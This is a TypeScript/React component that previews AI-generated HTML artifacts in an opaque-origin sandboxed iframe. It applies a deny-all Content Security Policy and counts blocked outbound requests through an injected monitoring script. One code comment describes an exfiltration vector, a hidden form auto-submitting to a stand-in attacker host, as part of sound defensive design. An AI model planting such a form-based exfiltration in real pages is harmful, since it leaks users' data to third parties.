"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import type { ParseResult } from "../lib/artifactParser";
import { StatBadge } from "./StatBadge";

// ---------------------------------------------------------------------------
// Private On-Device Artifacts — live preview pane (design §3–§7).
//
// This component is PURELY PRESENTATIONAL: it consumes a `ParseResult` snapshot
// produced by the parser in page.tsx (Task 7) and renders the CLOSED primary
// artifact inside a network-restricted sandbox. It does NO data fetching of its
// own; the only "traffic" is the postMessage handshake FROM the sandbox it
// itself created.
//
// ARCHITECTURE DECISION (design §7, Q2): the default Sandpack RUNTIME bundler
// fetches npm dependencies from a third-party CDN, which violates Req 4's
// "deny outbound, no allowlist" posture. The egress SECURITY model in §5/§6
// depends on OUR OWN control of the preview document — so instead of a hosted
// remote preview we render into a SELF-CONTROLLED sandboxed `<iframe srcdoc>`
// whose HTML we author. Authoring the document ourselves is what lets us inject
// the exact CSP `<meta>` (§5, prevention) AND the in-sandbox verification
// bootstrap (§6, verification). No network dependency exists at preview time
// and no heavy new package is required.
// ---------------------------------------------------------------------------

// Idle/stall timeout for an unclosed block (design §4, resolves Q3). Measured as
// time-since-the-last-token-that-changed-primaryCode (idle/stall), NOT
// wall-clock-since-open, so steady slow streaming never trips it (Req 7.2, 7.3).
export const INCOMPLETE_BLOCK_IDLE_TIMEOUT_MS = 4000;

// ===========================================================================
// §5 PREVENTION — the exact preview CSP.
//
// This string is the load-bearing egress-prevention contract (design §5,
// Property 5). The `'none'` directives are non-negotiable and appear verbatim;
// `form-action` and `base-uri` do NOT inherit from `default-src` per the CSP
// spec, so they are stated explicitly — otherwise a malicious artifact could
// auto-submit a hidden `<form action="https://attacker.example">`, which is a
// NAVIGATION (not a fetch/XHR/WebSocket call) and would bypass `connect-src`
// entirely. `connect-src 'none'` and `form-action 'none'` ARE enforced via this
// `<meta>`-delivered CSP (verified in a real browser: Chrome refuses the fetch
// and blocks the form submission, and zero packets leave).
//
// HONEST CAVEAT — `frame-ancestors 'none'` is currently a NO-OP. Per the CSP
// spec, `frame-ancestors` only takes effect when the CSP is delivered as an
// HTTP RESPONSE HEADER; a `<meta>`-delivered policy IGNORES it (Chrome logs a
// console warning to this effect). We keep the directive in the string because
// it is harmless and would become active if the preview ever moves to a
// header-delivered CSP (served from our own origin — see Task 12), but it is NOT
// hardening anything right now, so nothing here relies on it. The clickjacking
// risk it would address is low for a self-authored srcdoc preview.
//
// Only the minimal keyword/scheme sources the static HTML template genuinely
// needs are added: inline `<script>`/`<style>` (the artifact + our bootstrap
// are inline) and `img-src data:` (self-contained data-URI images only; no
// remote image loads).
// ===========================================================================
export const PREVIEW_CSP =
  "default-src 'none'; " +
  "connect-src 'none'; " +
  "form-action 'none'; " +
  "frame-ancestors 'none'; " +
  "base-uri 'none'; " +
  "script-src 'unsafe-inline'; " +
  "style-src 'unsafe-inline'; " +
  "img-src data:";

// The iframe sandbox tokens (design §5, Property 5). `allow-scripts` is required
// to RUN the artifact and our verification bootstrap; `allow-same-origin` is
// deliberately OMITTED so the framed document runs in an opaque (unique) origin.
// A frame granted BOTH tokens can remove its own sandboxing and un-sandbox
// itself — combining them would defeat the whole restriction, so we never do.
export const PREVIEW_SANDBOX = "allow-scripts";

// A stable marker on every postMessage from our in-sandbox bootstrap, so the
// host can distinguish our handshake from unrelated window messages (§6).
const EGRESS_MARKER = "__tokenquick_egress";

// ===========================================================================
// §6 VERIFICATION — the derived, HONEST egress status.
//
// PREVENTION (§5, above) is what BLOCKS outbound requests. VERIFICATION (this
// type + the indicator) is a separate thing: a runtime signal that PROVES
// whether any blocked attempt actually occurred. The two are NEVER conflated —
// "verified" is derived ONLY from the live postMessage handshake below, NEVER
// from the mere presence of the CSP string in config (Req 5.1, 5.5).
// ===========================================================================
export type EgressMode = "verified-zero" | "blocked" | "configured-only";

export interface EgressStatus {
  mode: EgressMode;
  blockedCount: number;
}

// The message our in-sandbox bootstrap posts to the host. `listenerActive` is
// the handshake: its arrival is what upgrades the indicator from
// "configured-only" to a runtime-verified state (Req 5.3).
interface EgressMessage {
  [EGRESS_MARKER]: true;
  listenerActive: boolean;
  blockedCount: number;
}

// Pure host-side derivation of the honest EgressStatus from a single handshake
// message (design §6, Property 6). Extracted as a pure function so the mapping
// can be unit-tested directly against the message shape (Task 8) — the runtime
// listener below calls it, so behavior is identical to the previous inline logic:
//   • blockedCount >= 1        → "blocked"
//   • listenerActive & count 0 → "verified-zero"
//   • otherwise (no live handshake) → null ⇒ host keeps "configured-only".
// "verified" is NEVER derived from config presence — only from this live message.
export function deriveEgressStatus(
  data: Partial<EgressMessage> | null | undefined
): EgressStatus | null {
  if (!data || data[EGRESS_MARKER] !== true) return null;
  const blockedCount =
    typeof data.blockedCount === "number" ? data.blockedCount : 0;
  if (blockedCount >= 1) {
    return { mode: "blocked", blockedCount }; // Req 5.2
  }
  if (data.listenerActive) {
    return { mode: "verified-zero", blockedCount: 0 }; // Req 5.3
  }
  return null; // no handshake ⇒ stay "configured-only" (Req 5.4)
}

export interface ArtifactPreviewProps {
  report: ParseResult | null;
  streamEnded: boolean;
}

// ---------------------------------------------------------------------------
// §6 in-sandbox bootstrap. This runs INSIDE the opaque-origin sandbox, BEFORE
// the artifact body, and is our honest runtime egress instrumentation. Because
// a no-`allow-same-origin` child does not propagate its `securitypolicyviolation`
// events to the host and the host cannot script into it, we inject the listener
// into the document ITSELF and report the tally out via `postMessage`
// (design §6, option A). This is a good-faith telemetry signal that OBSERVES the
// §5 boundary — it is not itself the security boundary.
// ---------------------------------------------------------------------------
// Exported ONLY for the focused security check (Task 8) so the in-sandbox
// counting logic can be exercised in a jsdom context WITHOUT changing any
// runtime behavior. The runtime still calls it exactly as before via
// buildHtmlSrcDoc(); exporting it does not alter what it produces.
export function buildBootstrapScript(): string {
  return `
(function () {
  var blockedCount = 0;
  function report() {
    try {
      window.parent.postMessage(
        { ${JSON.stringify(EGRESS_MARKER)}: true, listenerActive: true, blockedCount: blockedCount },
        "*"
      );
    } catch (e) { /* opaque-origin postMessage to parent is always allowed */ }
  }
  function bump() { blockedCount++; report(); }

  // (1) CSP violation events — count the network sink directive (connect-src)
  //     AND the navigation vectors (form-action / base-uri) that do NOT inherit
  //     from default-src. A form submission blocked by the CSP is caught here
  //     through the SAME honest counter as the scripting sinks (§6, Req 4.2).
  window.addEventListener("securitypolicyviolation", function (e) {
    var d = e.violatedDirective || e.effectiveDirective || "";
    if (
      d.indexOf("connect-src") === 0 ||
      d.indexOf("form-action") === 0 ||
      d.indexOf("base-uri") === 0 ||
      d.indexOf("default-src") === 0
    ) {
      bump();
    }
  });

  // (2) Monkey-patch the five scripting sinks. IMPORTANT (honesty): a sink is
  //     counted as blocked ONLY when the underlying call actually FAILS —
  //     i.e. it throws synchronously, or (for fetch) the returned promise
  //     rejects. We do NOT bump unconditionally on every call. Under the
  //     current all-deny CSP (connect-src 'none') every outbound attempt fails,
  //     so this still counts them all — but the counter is now decoupled from
  //     that assumption: if the CSP were ever loosened for an unrelated reason,
  //     a call that genuinely SUCCEEDED would not be miscounted as "blocked",
  //     keeping the indicator honest (Req 5.2, 5.3).
  try {
    var _fetch = window.fetch;
    if (_fetch) {
      window.fetch = function () {
        var pr;
        try {
          pr = _fetch.apply(this, arguments);
        } catch (e) {
          bump(); // synchronous throw = blocked
          return Promise.reject(e);
        }
        // Only count as blocked if the request actually rejects (e.g. CSP
        // blocked it); a fulfilled response is NOT counted.
        return Promise.resolve(pr).then(
          function (res) { return res; },
          function (err) { bump(); throw err; }
        );
      };
    }
  } catch (e) {}
  try {
    var _open = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function () {
      try {
        return _open.apply(this, arguments);
      } catch (e) { bump(); throw e; }
    };
    var _send = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function () {
      // A CSP-blocked XHR surfaces as an async 'error' event, not a throw.
      try { this.addEventListener("error", function () { bump(); }); } catch (e) {}
      try {
        return _send.apply(this, arguments);
      } catch (e) { bump(); throw e; }
    };
  } catch (e) {}
  try {
    var _WS = window.WebSocket;
    if (_WS) {
      window.WebSocket = function () {
        try {
          var ws = new _WS(arguments[0], arguments[1]);
          // A blocked WS surfaces as an async 'error' event.
          try { ws.addEventListener("error", function () { bump(); }); } catch (e) {}
          return ws;
        } catch (e) { bump(); throw e; } // synchronous SecurityError = blocked
      };
    }
  } catch (e) {}
  try {
    var _ES = window.EventSource;
    if (_ES) {
      window.EventSource = function () {
        try {
          var es = new _ES(arguments[0], arguments[1]);
          try { es.addEventListener("error", function () { bump(); }); } catch (e) {}
          return es;
        } catch (e) { bump(); throw e; }
      };
    }
  } catch (e) {}
  try {
    if (navigator.sendBeacon) {
      var _beacon = navigator.sendBeacon.bind(navigator);
      navigator.sendBeacon = function () {
        var ok;
        try {
          ok = _beacon.apply(navigator, arguments);
        } catch (e) { bump(); return false; } // threw = blocked
        // sendBeacon returns false when the user agent refused to queue it
        // (e.g. blocked by CSP) — count that as a blocked attempt.
        if (ok === false) bump();
        return ok;
      };
    }
  } catch (e) {}

  // (3) Capture-phase submit interceptor — the form/navigation exfiltration
  //     vector (§6, Req 4.2). We preventDefault() ANY form submission before the
  //     default navigation, so the submission is ACTUALLY blocked here (it never
  //     leaves the sandbox); counting it therefore reflects a real block, not an
  //     unconditional tick. Belt-and-suspenders with form-action 'none' in the
  //     CSP (which also fires a securitypolicyviolation counted in (1)).
  window.addEventListener("submit", function (e) {
    try { e.preventDefault(); } catch (ex) {}
    bump(); // the submission was blocked (prevented) — a real blocked attempt
  }, true);

  // (4) Handshake: announce the listener is live, with the current (zero) tally.
  //     Its arrival is what lets the host report a runtime-VERIFIED state.
  report();
})();
`;
}

// Build the full self-authored preview document for the `html` template. We
// control every byte: the CSP <meta> (§5) and the bootstrap <script> (§6) are
// injected into <head> BEFORE the artifact body so instrumentation is armed
// first. The artifact `code` is treated as page body/HTML (design §3).
// Exported ONLY for the security check (Task 8); runtime behavior unchanged.
export function buildHtmlSrcDoc(code: string): string {
  return `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}" />
<script>${buildBootstrapScript()}</script>
</head>
<body>
${code}
</body>
</html>`;
}

// EgressIndicator — the honest §6 label. The wording distinguishes prevention
// from verification and NEVER claims "verified" without the live handshake.
function EgressIndicator({ status }: { status: EgressStatus }) {
  if (status.mode === "blocked") {
    // Req 5.2 — the in-sandbox listener caught ≥1 blocked outbound attempt.
    return (
      <span className="rounded-full bg-amber-500/90 px-2.5 py-0.5 text-xs font-bold text-slate-900">
        blocked {status.blockedCount} outbound attempt
        {status.blockedCount === 1 ? "" : "s"}
      </span>
    );
  }
  if (status.mode === "verified-zero") {
    // Req 5.3 — handshake live AND zero blocked attempts observed after run.
    return (
      <span className="rounded-full bg-amber-500/20 px-2.5 py-0.5 text-xs font-mono font-bold text-amber-300">
        0 outbound calls (verified)
      </span>
    );
  }
  // Req 5.4 — handshake did NOT establish; fall back to the honest
  // configured-only label. NEVER "verified" (Req 5.1, 5.5).
  return (
    <span className="rounded-full border border-amber-400/70 px-2.5 py-0.5 text-xs font-medium text-amber-300">
      restriction configured (not runtime-verified)
    </span>
  );
}

// Raw-code fallback (Req 7.6) — shows the artifact text VERBATIM, no execution.
// Redaction placeholders (e.g. ⟦REDACTED_EMAIL⟧) are ordinary characters and
// render as literal text here too (Req 10.1–10.3).
function RawCodeFallback({ code, note }: { code: string; note: string }) {
  return (
    <div className="space-y-2">
      <p className="text-[11px] text-amber-300/80">{note}</p>
      <pre className="max-h-96 overflow-auto rounded-lg border border-slate-700 bg-slate-900 p-3 text-xs text-slate-200 whitespace-pre-wrap break-words">
        <code>{code}</code>
      </pre>
    </div>
  );
}

const CARD =
  "rounded-xl bg-slate-800 border border-slate-700 p-4 space-y-4 shadow-sm";
const HEADING =
  "text-xs font-semibold text-amber-300 uppercase tracking-wide";

export function ArtifactPreview({ report, streamEnded }: ArtifactPreviewProps) {
  // ---- Egress verification state (§6) ------------------------------------
  const [egress, setEgress] = useState<EgressStatus>({
    mode: "configured-only",
    blockedCount: 0,
  });
  const iframeRef = useRef<HTMLIFrameElement | null>(null);

  // ---- Idle/stall tracking for the unclosed-block fallback (§4, Req 7.5) --
  // We remember the primaryCode length at the last change and when it changed,
  // then flip `idleTimedOut` if no growth occurs for the timeout window while
  // still IN_ARTIFACT. This is time-since-last-token, so steady slow streaming
  // keeps resetting the timer and never trips (Req 7.2, 7.3).
  const [idleTimedOut, setIdleTimedOut] = useState(false);
  const lastLenRef = useRef<number>(0);
  const lastChangeAtRef = useRef<number>(Date.now());

  const state = report?.state ?? null;
  const primaryCode = report?.primaryCode ?? "";
  const primaryLen = primaryCode.length;

  useEffect(() => {
    // Reset the idle classifier whenever primaryCode grows (a new token
    // arrived) — this is the reset-on-progress rule (Req 7.3).
    if (primaryLen !== lastLenRef.current) {
      lastLenRef.current = primaryLen;
      lastChangeAtRef.current = Date.now();
      setIdleTimedOut(false);
    }
  }, [primaryLen]);

  useEffect(() => {
    // Only arm the stall timer while the block is genuinely open and the stream
    // has not already ended (stream-end is handled separately, Req 7.4).
    if (state !== "IN_ARTIFACT" || streamEnded) {
      setIdleTimedOut(false);
      return;
    }
    const timer = setTimeout(() => {
      // Only classify as abandoned if no new token arrived in the window.
      if (Date.now() - lastChangeAtRef.current >= INCOMPLETE_BLOCK_IDLE_TIMEOUT_MS) {
        setIdleTimedOut(true);
      }
    }, INCOMPLETE_BLOCK_IDLE_TIMEOUT_MS);
    return () => clearTimeout(timer);
  }, [state, streamEnded, primaryLen]);

  // ---- §6 host-side handshake listener -----------------------------------
  // Validate BOTH the source (must be OUR iframe's contentWindow) and the
  // marker before trusting a message. Deriving EgressStatus ONLY from this live
  // handshake is what keeps "verified" honest (Req 5.1, 5.5).
  useEffect(() => {
    function onMessage(event: MessageEvent) {
      const iframeWin = iframeRef.current?.contentWindow;
      if (!iframeWin || event.source !== iframeWin) return;
      const data = event.data as Partial<EgressMessage> | null;
      const next = deriveEgressStatus(data);
      // A non-null derivation upgrades the indicator to a runtime-verified state;
      // null (no valid handshake) leaves us at the honest "configured-only"
      // baseline (Req 5.4).
      if (next) setEgress(next);
    }
    window.addEventListener("message", onMessage);
    return () => window.removeEventListener("message", onMessage);
  }, []);

  const lang = (report?.lang ?? "").toLowerCase();
  // Template selection from the language tag (design §3, Req 1.4/3.2). `html`
  // is the default for null/unknown tags.
  const template: "html" | "react" =
    lang === "react" ? "react" : "html";

  // Reset egress state each time we (re)build a preview document, so a stale
  // "verified" from a previous artifact never leaks into a new one.
  const srcDoc = useMemo(() => {
    if (state !== "CLOSED" || template !== "html") return null;
    return buildHtmlSrcDoc(primaryCode);
  }, [state, template, primaryCode]);

  useEffect(() => {
    // Whenever the preview document changes, reset to the honest baseline until
    // a fresh handshake arrives.
    setEgress({ mode: "configured-only", blockedCount: 0 });
  }, [srcDoc]);

  // ---- Empty state (Req 1.5) ---------------------------------------------
  // Nothing to preview: no report yet, or the generation had no artifact marker
  // at all. Render a small, sibling-consistent "No preview" affordance.
  if (!report || !report.sawAnyMarker) {
    return (
      <div className={CARD}>
        <div className="flex items-center justify-between">
          <h3 className={HEADING}>Live Artifact Preview</h3>
        </div>
        <div className="rounded-lg border border-dashed border-slate-700 bg-slate-900/40 p-4 text-center">
          <p className="text-sm text-slate-500">No preview for this generation.</p>
        </div>
      </div>
    );
  }

  // Decide what to show in the main preview area.
  let body: React.ReactNode;

  if (state === "IN_ARTIFACT") {
    if (streamEnded) {
      // Stream ended with the block still open → abandoned/malformed (Req 7.4).
      body = (
        <RawCodeFallback
          code={primaryCode}
          note="Artifact block was never closed before the stream ended — showing raw code."
        />
      );
    } else if (idleTimedOut) {
      // Idle stall past the timeout (Req 7.5).
      body = (
        <RawCodeFallback
          code={primaryCode}
          note="Artifact block stalled with no new tokens — showing raw code."
        />
      );
    } else {
      // Still streaming, wait (Req 2.4, 7.3) — show the partial code + a
      // streaming affordance, never a crash.
      body = (
        <div className="space-y-2">
          <div className="flex items-center gap-2">
            <span className="h-2 w-2 rounded-full bg-amber-400 animate-pulse" />
            <span className="text-xs text-slate-400">Streaming artifact…</span>
          </div>
          <pre className="max-h-96 overflow-auto rounded-lg border border-slate-700 bg-slate-900 p-3 text-xs text-slate-200 whitespace-pre-wrap break-words">
            <code>{primaryCode}</code>
          </pre>
        </div>
      );
    }
  } else if (state === "CLOSED") {
    if (template === "react") {
      // Per design §7: the `react` template requires a pre-vendored/pre-bundled
      // static React bundle (no runtime npm fetch). Fully vendoring React into
      // the srcdoc is deferred to a follow-up; we do NOT fall back to a network
      // bundler. Until then, render the raw code with an explicit note
      // (Req 7.6 semantics — verbatim, no partial execution).
      body = (
        <RawCodeFallback
          code={primaryCode}
          note="Live preview not yet available for React — showing raw code. This is a known limitation (a vendored, offline React bundle is planned, tracked as Task 12); it is not a bug, and no network bundler is ever used."
        />
      );
    } else if (srcDoc) {
      // §5 PREVENTION: opaque-origin sandbox (allow-scripts, NO
      // allow-same-origin) + injected CSP. §6 VERIFICATION: the bootstrap in
      // srcDoc posts its handshake, which drives EgressIndicator above.
      body = (
        <iframe
          ref={iframeRef}
          title="Artifact preview"
          sandbox={PREVIEW_SANDBOX}
          srcDoc={srcDoc}
          className="h-96 w-full rounded-lg border border-slate-700 bg-white"
        />
      );
    } else {
      // Defensive: CLOSED but no document could be built → raw fallback (Req 7.1).
      body = (
        <RawCodeFallback
          code={primaryCode}
          note="Could not build a preview for this artifact — showing raw code."
        />
      );
    }
  } else {
    // OUTSIDE with sawAnyMarker (e.g. text before an as-yet-unopened marker):
    // nothing to preview yet.
    body = (
      <div className="rounded-lg border border-dashed border-slate-700 bg-slate-900/40 p-4 text-center">
        <p className="text-sm text-slate-500">Waiting for artifact…</p>
      </div>
    );
  }

  // Only show the egress indicator when we actually have a running preview —
  // it describes the sandbox, so it is meaningless on the raw-code fallback.
  const showEgress = state === "CLOSED" && template === "html" && !!srcDoc;

  return (
    <div className={CARD}>
      <div className="flex items-center justify-between">
        <h3 className={HEADING}>Live Artifact Preview</h3>
        {showEgress && <EgressIndicator status={egress} />}
      </div>

      {/* language / template caption */}
      <p className="text-[11px] text-slate-500">
        template: {template}
        {report.lang ? ` · lang: ${report.lang}` : " · lang: (default)"}
      </p>

      {body}

      {/* Additional (non-primary) artifact blocks render as PLAIN, NON-executed
          code beneath the preview (Req 9.2b, 9.3). Only the primary ever runs
          in the sandbox. */}
      {report.extraBlocks.length > 0 && (
        <div className="space-y-2">
          <p className="text-xs text-slate-400 uppercase tracking-wider">
            Additional blocks (not executed)
          </p>
          {report.extraBlocks.map((block, i) => (
            <pre
              key={i}
              className="max-h-64 overflow-auto rounded-lg border border-slate-700 bg-slate-900 p-3 text-xs text-slate-300 whitespace-pre-wrap break-words"
            >
              <code>{block}</code>
            </pre>
          ))}
        </div>
      )}

      {/* A compact reminder of the prevention posture. This is NOT the
          verification signal (that is the EgressIndicator above); it documents
          the always-applied §5 restriction for the reader. */}
      {showEgress && (
        <div className="flex gap-3 flex-wrap">
          <StatBadge label="Sandbox" value="opaque-origin" />
          <StatBadge label="Egress" value="deny-all" />
        </div>
      )}
    </div>
  );
}
